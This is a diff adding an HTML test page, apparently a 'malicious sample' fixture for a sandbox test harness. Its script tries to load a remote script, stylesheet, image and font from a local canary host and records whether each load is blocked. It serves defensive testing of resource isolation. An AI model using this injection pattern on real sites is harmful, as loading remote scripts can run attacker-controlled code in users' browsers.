@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<title>m06-external-res 載入外部資源</title>
+</head>
+<body>
+<main><h1>m06-external-res</h1><p>malicious sample（載入外部資源）</p></main>
+<script type="module">
+
+const DEF = { canaryHttp: "http://127.0.0.1:8873", canaryUdpPort: 8874, mainOrigin: "http://localhost:8871", navTarget: "http://127.0.0.1:8873/nav", mode: "real" };
+const T = Object.assign({}, DEF, (typeof window !== "undefined" && window.__pttTargets) || {});
+const C = T.canaryHttp;
+const DURATION = 10;
+const embedded = window.parent !== window;
+const mark = (k, v) => { try { document.body.dataset[k] = String(v); } catch {} };
+const render = (t) => { t = Math.max(0, Math.min(DURATION, Number(t) || 0)); try { document.body.dataset.t = String(t); } catch {} };
+addEventListener("message", (e) => { if (e.source !== window.parent) return; const m = e.data; if (!m || m.ptt !== 1 || m.type !== "seek" || typeof m.t !== "number" || !Number.isFinite(m.t)) return; render(m.t); });
+const sendReady = () => { if (embedded) { try { parent.postMessage({ ptt: 1, type: "ready", duration: DURATION }, "*"); } catch {} } };
+render(0);
+
+async function attack() {
+
+  const s = document.createElement("script"); s.src = C + "/m06.js"; s.onerror = () => mark("scriptErr", "1"); document.head.append(s);
+  const l = document.createElement("link"); l.rel = "stylesheet"; l.href = C + "/m06.css"; l.onerror = () => mark("styleErr", "1"); document.head.append(l);
+  const i = document.createElement("img"); i.src = C + "/m06.png"; i.onerror = () => mark("imgErr", "1"); i.onload = () => mark("imgLoad", "1"); document.body.append(i);
+  const st = document.createElement("style"); st.textContent = '@font-face{font-family:evil;src:url("' + C + '/m06.woff2")} body{font-family:evil}'; document.head.append(st);
+  const probe = document.createElement("span"); probe.style.fontFamily = "evil"; probe.textContent = "probe"; document.body.append(probe);
+  try { await document.fonts.load('16px evil'); } catch (e) {}
+}
+// 使用者啟用變體：測試會以真實滑鼠點擊 iframe，觸發需要啟用的攻擊（彈窗、對話框、下載、頂層導覽、權限）再跑一次
+document.addEventListener("click", () => { attack().catch((e) => mark("attackClickError", e && e.name)); });
+attack().catch((e) => mark("attackError", e && e.name)).finally(sendReady);
+</script>
+</body>
+</html>
